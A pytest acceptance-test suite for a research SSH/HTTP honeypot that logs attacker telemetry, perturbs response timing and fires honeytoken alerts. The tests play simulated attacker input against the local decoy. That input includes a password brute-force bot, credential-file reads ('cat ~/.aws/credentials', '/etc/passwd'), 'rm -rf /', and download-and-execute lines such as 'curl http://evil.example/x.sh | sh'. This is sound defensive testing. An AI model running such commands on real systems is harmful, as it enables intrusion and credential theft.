"""
Acceptance Tests for Module A: Decoy Server & Telemetry
Per Technical Specification Section 2.3:
- Test A1: Telemetry Completeness
- Test A2: Perturbation Schedule Determinism
- Test A3: Host Isolation
"""

import os
import shutil
import tempfile
import time
import uuid
import pytest
import pandas as pd

from src.decoy import (
    DecoyServer,
    PseudoFilesystem,
    PerturbationEngine,
    Regime,
    TelemetryLogger,
    TelemetryEvent
)

@pytest.fixture
def temp_env():
    temp_dir = tempfile.mkdtemp()
    telemetry_path = os.path.join(temp_dir, "test_telemetry.csv")
    yield temp_dir, telemetry_path
    shutil.rmtree(temp_dir, ignore_errors=True)

def decoy_config(temp_dir, telemetry_path, **kw):
    from src.decoy import DecoyConfig
    return DecoyConfig(ssh_port=0, http_port=0, telemetry_path=telemetry_path,
                       regime_schedule_path=os.path.join(temp_dir, "sched.csv"),
                       auth_path=os.path.join(temp_dir, "auth.csv"),
                       signals_path=os.path.join(temp_dir, "signals.csv"),
                       ssh_host_key_path=os.path.join(temp_dir, "host_key"), **kw)


def test_a1_telemetry_completeness(temp_env):
    temp_dir, telemetry_path = temp_env
    logger = TelemetryLogger(telemetry_path)
    
    sessions = [str(uuid.uuid4()) for _ in range(3)]
    commands = [
        "ls", "cd /tmp", "pwd", "whoami", "id",
        "ls", "cat /etc/passwd", "touch file.txt", "rm file.txt", "uname"
    ]
    
    for session_id in sessions:
        for idx, cmd in enumerate(commands):
            event = TelemetryEvent(
                session_id=session_id,
                timestamp_ns=time.monotonic_ns(),
                source_ip="127.0.0.1",
                protocol="SSH",
                command_index=idx,
                command_raw=cmd,
                command_root=cmd.split()[0],
                current_path="/home/user",
                regime="baseline" if idx < 3 else "slowdown",
                delta_t_ns=100000 if idx > 0 else 0,
                response_sent=True
            )
            logger.log_event(event)
            
    df = pd.read_csv(telemetry_path)
    assert len(df) == 30, f"Expected 30 rows, got {len(df)}"
    assert set(df["session_id"].unique()) == set(sessions)
    assert set(df["command_index"].unique()) == set(range(10))
    assert (df["timestamp_ns"] > 0).all()

def test_a2_perturbation_schedule_determinism():
    engine1 = PerturbationEngine(seed=42)
    engine2 = PerturbationEngine(seed=42)
    
    regimes1 = [engine1.get_regime_for_command(i).value for i in range(10)]
    regimes2 = [engine2.get_regime_for_command(i).value for i in range(10)]
    
    assert regimes1 == regimes2

def test_a3_host_isolation():
    """Test A3: Attacker commands are not executed on host."""
    pfs = PseudoFilesystem("test-session")
    out, new_path, weight = pfs.execute_command("rm -rf /")
    assert "command not found" in out or out == ""
    assert pfs.cwd == "/home/user"


@pytest.mark.parametrize("tarpit", [False, True])
def test_a4_tcp_tarpit(temp_env, tarpit):
    """Test A4: Tarpit shrinks the receive buffer of both listeners; sessions still work."""
    import socket
    import urllib.request
    temp_dir, telemetry_path = temp_env

    def client(ports):
        with urllib.request.urlopen(f"http://127.0.0.1:{ports['http']}/") as r:
            return r.read()

    body, bufs = _run_with_decoy(temp_dir, telemetry_path, client, tarpit=tarpit, return_bufs=True)
    assert b"Apache2 Ubuntu Default Page" in body
    default_buf = socket.socket().getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)
    for buf in bufs:
        assert (buf < default_buf) if tarpit else (buf == default_buf)


def _run_with_decoy(temp_dir, telemetry_path, client_fn, return_bufs=False, **config_kw):
    """Start SSH + HTTP decoys, run blocking client_fn({'ssh': port, 'http': port}) in a thread."""
    import asyncio
    import socket
    config = decoy_config(temp_dir, telemetry_path, **config_kw)

    async def scenario():
        server = DecoyServer(host="127.0.0.1", config=config)
        ssh, http = await server.start_listeners()
        socks = [ssh.sockets[0], http.sockets[0]]
        ports = {"ssh": socks[0].getsockname()[1], "http": socks[1].getsockname()[1]}
        try:
            result = await asyncio.wait_for(asyncio.to_thread(client_fn, ports), timeout=60)
            bufs = [s.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF) for s in socks]
            return (result, bufs) if return_bufs else result
        finally:
            ssh.close()
            await http.close()
    return asyncio.run(scenario())


def _run_with_ssh_decoy(temp_dir, telemetry_path, client_fn):
    return _run_with_decoy(temp_dir, telemetry_path, lambda ports: client_fn(ports["ssh"]))


def test_a5_ssh_bruteforce_then_interactive_shell(temp_env):
    """Test A5: A paramiko bot brute-forces, logs in, and drives the decoy shell over real SSH."""
    import paramiko
    temp_dir, telemetry_path = temp_env

    def bot(port):
        attempts = []
        for password in ["hunter2", "letmein", "Winter2024!"]:  # none common: accepted on 3rd try
            t = paramiko.Transport(("127.0.0.1", port))
            t.connect()
            banner = t.remote_version
            if not attempts:  # offer an SSH key first, as many bots do; it must be refused and logged
                try:
                    t.auth_publickey("admin", paramiko.RSAKey.generate(1024))
                except paramiko.AuthenticationException:
                    pass
            try:
                t.auth_password("admin", password)
                attempts.append(True)
                break
            except paramiko.AuthenticationException:
                attempts.append(False)
                t.close()
        chan = t.open_session()
        chan.get_pty()
        chan.invoke_shell()
        out = b""

        def read_until_prompt():
            nonlocal out
            deadline = time.time() + 5
            start = len(out)
            while time.time() < deadline and not out[start:].rstrip().endswith(b"$"):
                if chan.recv_ready():
                    out += chan.recv(4096)
                else:
                    time.sleep(0.05)

        read_until_prompt()  # banner + first prompt
        for cmd in ["whoami", "cat ~/.aws/credentials"]:
            chan.send(cmd + "\n")
            read_until_prompt()
        chan.send("exit\n")
        t.close()
        return banner, attempts, out.decode(errors="ignore")

    banner, attempts, transcript = _run_with_ssh_decoy(temp_dir, telemetry_path, bot)

    assert banner.startswith("SSH-2.0-OpenSSH_8.9p1")
    assert attempts == [False, False, True]
    assert "admin@srv-prod-01" in transcript
    assert "AKIAIOSFODNN7EXAMPLE" in transcript

    auth = pd.read_csv(os.path.join(temp_dir, "auth.csv"))
    assert {"hunter2", "letmein"} & set(auth["password"])
    assert auth["accepted"].iloc[-1]
    assert auth["client_version"].str.startswith("SSH-2.0-paramiko").all()

    signals = pd.read_csv(os.path.join(temp_dir, "signals.csv"))
    hassh_values = signals[signals["kind"] == "hassh"]["value"]
    assert hassh_values.str.fullmatch(r"[0-9a-f]{32}").all() and len(hassh_values) == 3  # one per connection
    assert signals[signals["kind"] == "pubkey"]["value"].str.startswith("admin:SHA256:").all()
    assert list(signals[signals["kind"] == "login_attempt"]["value"]) == [
        "admin:hunter2", "admin:letmein", "admin:Winter2024!"]

    telemetry = pd.read_csv(telemetry_path)
    assert list(telemetry["command_raw"]) == ["whoami", "cat ~/.aws/credentials"]
    assert set(telemetry["protocol"]) == {"SSH"}


def test_a6_ssh_exec_command(temp_env):
    """Test A6: `ssh root@host 'uname -a; id'` with a common password runs both commands, non-interactively."""
    import paramiko
    temp_dir, telemetry_path = temp_env

    def bot(port):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect("127.0.0.1", port=port, username="root", password="123456",
                       look_for_keys=False, allow_agent=False)
        _, stdout, _ = client.exec_command("uname -a; whoami")
        out = stdout.read().decode()
        client.close()
        return out

    out = _run_with_ssh_decoy(temp_dir, telemetry_path, bot)
    assert "Linux" in out and "root" in out
    assert "srv-prod-01:" not in out  # no prompts in exec mode
    assert len(pd.read_csv(telemetry_path)) == 2


def test_a7_http_decoy(temp_env):
    """Test A7: HTTP decoy serves Apache-looking pages and honeytokens, logs form creds,
    and records each request as a perturbed command in one per-IP session."""
    import urllib.error
    import urllib.parse
    import urllib.request
    temp_dir, telemetry_path = temp_env

    def scanner(ports):
        base = f"http://127.0.0.1:{ports['http']}"
        results = {}
        for path in ["/", "/.env", "/wp-admin/", "/nope.php"]:
            try:
                with urllib.request.urlopen(base + path) as r:
                    results[path] = (r.status, r.headers["Server"], r.read().decode())
            except urllib.error.HTTPError as e:
                results[path] = (e.code, e.headers["Server"], e.read().decode())
        data = urllib.parse.urlencode({"log": "admin", "pwd": "<script>x</script>"}).encode()
        with urllib.request.urlopen(base + "/wp-login.php", data=data) as r:
            results["login"] = (r.status, r.headers["Server"], r.read().decode())
        return results

    r = _run_with_decoy(temp_dir, telemetry_path, scanner)

    assert all(server == "Apache/2.4.52 (Ubuntu)" for _, server, _ in r.values())
    assert r["/"][0] == 200 and "It works" in r["/"][2]
    assert r["/.env"][0] == 200 and "password" in r["/.env"][2]
    assert r["/wp-admin/"][0] == 200 and "loginform" in r["/wp-admin/"][2]  # followed the 302
    assert r["/nope.php"][0] == 404
    assert "is incorrect" in r["login"][2] and "<script>" not in r["login"][2]  # reflected input escaped

    auth = pd.read_csv(os.path.join(temp_dir, "auth.csv"))
    assert list(auth[["protocol", "username", "password"]].iloc[0]) == ["HTTP", "admin", "<script>x</script>"]

    signals = pd.read_csv(os.path.join(temp_dir, "signals.csv"))
    assert set(signals["kind"]) == {"header_order", "user_agent"} and len(signals) == 2  # once per session
    assert signals[signals["kind"] == "user_agent"]["value"].iloc[0].startswith("Python-urllib")

    telemetry = pd.read_csv(telemetry_path)
    assert telemetry["session_id"].nunique() == 1
    assert list(telemetry["command_raw"]) == ["GET /", "GET /.env", "GET /wp-admin/", "GET /wp-login.php",
                                              "GET /nope.php", "POST /wp-login.php"]
    assert list(telemetry["command_index"]) == list(range(6))


def test_a8_delta_t_excludes_injected_delay(temp_env):
    """Test A8: delta_t is the attacker's reaction time; our own R1 delay must not leak into it."""
    import asyncio
    from src.decoy import DecoyConfig
    from src.decoy.server import DecoySession
    temp_dir, telemetry_path = temp_env
    config = decoy_config(temp_dir, telemetry_path, default_schedule=[(0, Regime.R1_SLOWDOWN)])

    async def scenario():
        decoy = DecoyServer(host="127.0.0.1", config=config)
        session = DecoySession(decoy, "SSH", "127.0.0.1")
        for cmd in ["ls", "pwd", "id"]:
            await session.step(cmd, lambda c: ("", "/", 0))  # 100 ms injected delay each
            session.mark_response_end()
            await asyncio.sleep(0.05)  # attacker "reaction"
        session.close()

    asyncio.run(scenario())
    dts = pd.read_csv(telemetry_path)["delta_t_ns"].iloc[1:] / 1e6
    assert (dts >= 45).all() and (dts < 95).all(), list(dts)


def test_a9_engine_joins_signals_and_urls(temp_env):
    """Test A9: sessions.csv carries HASSH/user-agent signals and dropper URLs from the commands."""
    from src.analytics import CERFEngine
    temp_dir, telemetry_path = temp_env
    rows = [dict(session_id="s1", timestamp_ns=i, source_ip="9.9.9.9", protocol="SSH", command_index=i,
                 command_raw=c, command_root=c.split()[0], current_path="/", regime="baseline",
                 delta_t_ns=1000, response_sent=True)
            for i, c in enumerate(["uname -a", "wget http://evil.example/x.sh -O /tmp/x", "curl http://evil.example/x.sh | sh"])]
    pd.DataFrame(rows).to_csv(telemetry_path, index=False)
    signals_path = os.path.join(temp_dir, "signals.csv")
    from src.decoy.signals import SignalLogger
    log = SignalLogger(signals_path)
    log.log("s1", "9.9.9.9", "SSH", "hassh", "a" * 32)
    log.log("s1", "9.9.9.9", "SSH", "pubkey", "root:SHA256:abc")
    sessions = CERFEngine(telemetry_path=telemetry_path, output_dir=temp_dir, embedding="pca",
                          signals_path=signals_path).run_pipeline()
    row = sessions.iloc[0]
    assert row["hassh"] == "a" * 32 and row["pubkeys"] == "root:SHA256:abc" and row["user_agent"] == ""
    assert row["download_urls"] == "http://evil.example/x.sh"


def test_a10_r3_drip_is_capped_and_fs_persists_per_ip(temp_env):
    """Test A10: a long R3 response drips within its time budget; files survive a reconnect."""
    import asyncio
    from src.decoy.server import DecoyServer, R3_DRIP_BUDGET_S
    from src.decoy.ssh_server import filesystem_for

    async def scenario():
        decoy = DecoyServer(host="127.0.0.1", config=decoy_config(*temp_env))
        chunks = []

        async def lines():
            yield "a" * 400

        async def drain():
            pass
        # one command in R3: schedule is irrelevant here, force the regime on the session engine
        from src.decoy.server import DecoySession
        real_step = DecoySession.step

        async def forced_step(self, raw, execute):
            out, _ = await real_step(self, raw, execute)
            return out, Regime.R3_FS_LATENCY
        DecoySession.step = forced_step
        try:
            fs = PseudoFilesystem("s")
            fs.execute_command = lambda c: ("x" * 400, "/", 0)
            start = time.monotonic()
            await decoy.run_session(lines(), chunks.append, drain, "SSH", "127.0.0.1", prompt=None, fs=fs)
            return time.monotonic() - start, "".join(chunks)
        finally:
            DecoySession.step = real_step

    elapsed, text = asyncio.run(scenario())
    assert len(text) == 400
    assert elapsed < R3_DRIP_BUDGET_S + 0.5  # budget + the regime's own 50 ms delay + timer slack

    first = filesystem_for("203.0.113.9", "root", "s1")
    first.execute_command("touch /tmp/dropped.sh")
    first.cwd = "/tmp"
    again = filesystem_for("203.0.113.9", "root", "s2")
    assert again is first and again.cwd == "/root" and "dropped.sh" in again.virtual_tree["/tmp"]
    assert filesystem_for("203.0.113.10", "root", "s3") is not first


def test_a11_regime_drop_rates():
    from src.analytics.benchmark import regime_drop_rates
    rows = [("s1", 0, "baseline"), ("s1", 1, "slowdown"), ("s2", 0, "baseline"), ("s2", 1, "slowdown"),
            ("s3", 0, "baseline"), ("s3", 1, "baseline")]
    df = pd.DataFrame(rows, columns=["session_id", "command_index", "regime"])
    rates = regime_drop_rates(df)
    assert rates == {"baseline": 0.25, "slowdown": 1.0}  # 1 of 4 baseline cmds ended a session; both slowdown cmds did


def test_a12_control_arm_gets_no_perturbation(temp_env):
    """Test A12: control_fraction=1 puts every session in the control arm: all baseline, arm logged."""
    import asyncio
    from src.decoy import DecoyConfig
    from src.decoy.server import DecoySession
    temp_dir, telemetry_path = temp_env
    config = decoy_config(temp_dir, telemetry_path, control_fraction=1.0)

    async def scenario():
        decoy = DecoyServer(host="127.0.0.1", config=config)
        session = DecoySession(decoy, "SSH", "127.0.0.1")
        for i in range(10):  # the default schedule would reach R3 by command 6
            await session.step(f"cmd{i}", lambda c: ("", "/", 0))
        session.close()
        return session

    session = asyncio.run(scenario())
    assert session.arm == "control"
    assert set(pd.read_csv(telemetry_path)["regime"]) == {"baseline"}
    signals = pd.read_csv(os.path.join(temp_dir, "signals.csv"))
    assert list(signals[signals["kind"] == "arm"]["value"]) == ["control"]

    treated = decoy_config(temp_dir, telemetry_path, control_fraction=0.0)
    assert DecoySession(DecoyServer(host="127.0.0.1", config=treated), "SSH", "127.0.0.1").arm == "treatment"


def test_a13_limits(temp_env):
    """Test A13: per-IP/total connection caps, HTTP rate cap, session command cap."""
    import asyncio
    from src.decoy.limits import ConnectionLimiter, RateLimiter
    limiter = ConnectionLimiter(per_ip=2, total=3)
    assert limiter.acquire("a") and limiter.acquire("a") and not limiter.acquire("a")
    assert limiter.acquire("b") and not limiter.acquire("c")  # total of 3 reached
    limiter.release("a")
    assert limiter.acquire("c")

    rate = RateLimiter(limit=2, window_s=60)
    assert rate.allow("x") and rate.allow("x") and not rate.allow("x") and rate.allow("y")

    temp_dir, telemetry_path = temp_env
    config = decoy_config(temp_dir, telemetry_path, max_commands_per_session=3,
                          default_schedule=[(0, Regime.R0_BASELINE)])

    async def scenario():
        decoy = DecoyServer(host="127.0.0.1", config=config)

        async def lines():
            for i in range(10):
                yield f"echo {i}"

        async def drain():
            pass
        await decoy.run_session(lines(), lambda _: None, drain, "SSH", "127.0.0.1", prompt=None)

    asyncio.run(scenario())
    assert len(pd.read_csv(telemetry_path)) == 3


def test_a14_ssh_connection_cap_drops_extra_connections(temp_env):
    import paramiko
    temp_dir, telemetry_path = temp_env

    def client(ports):
        first = paramiko.Transport(("127.0.0.1", ports["ssh"]))
        first.connect()  # holds the only slot
        try:
            second = paramiko.Transport(("127.0.0.1", ports["ssh"]))
            second.connect()
            second.close()
            refused = False
        except (paramiko.SSHException, EOFError, OSError):
            refused = True
        first.close()
        return refused

    assert _run_with_decoy(temp_dir, telemetry_path, client, max_conns_per_ip=1) is True


def test_a15_canary_alerts_and_webhook(temp_env):
    """Test A15: honeytoken reads and download attempts raise one alert each (file + webhook)."""
    import asyncio
    import http.server
    import json
    import threading
    temp_dir, telemetry_path = temp_env
    received = []

    class Hook(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            received.append(json.loads(self.rfile.read(int(self.headers["Content-Length"]))))
            self.send_response(200)
            self.end_headers()

        def log_message(self, *args):
            pass

    hook = http.server.HTTPServer(("127.0.0.1", 0), Hook)
    threading.Thread(target=hook.serve_forever, daemon=True).start()
    alerts_path = os.path.join(temp_dir, "alerts.jsonl")
    config = decoy_config(temp_dir, telemetry_path, alerts_path=alerts_path,
                          alert_webhook=f"http://127.0.0.1:{hook.server_address[1]}/")

    async def scenario():
        decoy = DecoyServer(host="127.0.0.1", config=config)

        async def lines():
            for cmd in ["ls", "cat ~/.aws/credentials", "cat ~/.aws/credentials", "wget http://198.51.100.7/x.sh"]:
                yield cmd

        async def drain():
            pass
        await decoy.run_session(lines(), lambda _: None, drain, "SSH", "203.0.113.5", prompt=None)

    asyncio.run(scenario())
    alerts = [json.loads(line) for line in open(alerts_path)]
    assert [(a["kind"], a["value"]) for a in alerts] == [
        ("honeytoken_read", "/home/user/.aws/credentials"), ("download_attempt", "http://198.51.100.7/x.sh")]
    assert alerts[0]["source_ip"] == "203.0.113.5"
    deadline = time.time() + 5
    while len(received) < 2 and time.time() < deadline:
        time.sleep(0.05)
    hook.shutdown()
    assert len(received) == 2 and "honeytoken_read" in received[0]["text"]


def test_a16_sqlite_telemetry_feeds_the_engine(temp_env):
    """Test A16: a .db telemetry path stores the same rows and the CERF engine reads them."""
    from src.analytics import CERFEngine
    from src.analytics.telemetry_io import read_telemetry
    temp_dir, _ = temp_env
    db_path = os.path.join(temp_dir, "telemetry.db")
    logger = TelemetryLogger(db_path)
    for s in ("s1", "s2"):
        for i, cmd in enumerate(["ls", "id", "uname -a", "cat /etc/passwd"]):
            logger.log_event(TelemetryEvent(session_id=s, timestamp_ns=time.monotonic_ns(), source_ip="10.0.0.9",
                                            protocol="SSH", command_index=i, command_raw=cmd,
                                            command_root=cmd.split()[0], current_path="/", regime="baseline",
                                            delta_t_ns=1000 * i, response_sent=True))
    df = read_telemetry(db_path)
    assert len(df) == 8 and df["response_sent"].all() and set(df["session_id"]) == {"s1", "s2"}
    sessions = CERFEngine(telemetry_path=db_path, output_dir=temp_dir, embedding="pca").run_pipeline()
    assert len(sessions) == 2
